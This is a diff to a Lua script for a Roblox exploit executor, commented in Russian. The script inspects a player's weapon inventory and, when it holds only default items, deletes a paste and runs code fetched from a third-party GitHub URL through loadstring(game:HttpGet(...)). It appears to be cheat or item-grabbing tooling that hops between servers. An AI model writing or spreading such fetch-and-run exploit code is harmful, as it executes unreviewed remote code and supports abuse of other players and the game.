@@ -219,22 +219,37 @@ local function checkInventory()
             :InvokeServer(unpack(args))
     end)
 
-    if success and result then
-        local weapons = result.Weapons or {}
-        local owned = weapons.Owned or {}
-
-        if next(owned) == nil then
-            deletePaste()
-            print("все пусто нахуй!")
-            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Roma77799/Secrethub/refs/heads/main/OtherSCRIPTS/ServerHop'),true))()
-            return
-        else
-            print("Игрок имеет оружие!")
-        end
-    else
+    if not success or not result then
         warn("Не удалось получить инвентарь:", result)
+        return
+    end
+
+    local weapons = result.Weapons or {}
+    local owned = weapons.Owned or {}
+
+    -- Проверяем, пустой ли инвентарь (нет оружия ИЛИ остались только дефолтные)
+    local isOnlyDefault = true
+    local hasAnyWeapon = next(owned) ~= nil
+
+    if hasAnyWeapon then
+        for weaponName in pairs(owned) do
+            if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
+                isOnlyDefault = false
+                break
+            end
+        end
+    end
+
+    if not hasAnyWeapon or isOnlyDefault then
+        deletePaste()
+        print("все пусто нахуй! (только дефолт остался)")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Roma77799/Secrethub/refs/heads/main/OtherSCRIPTS/ServerHop", true))()
+        return
+    else
+        print("Игрок имеет оружие!")
     end
 end
+
 print("Скрипт загружен")
 
 while true do
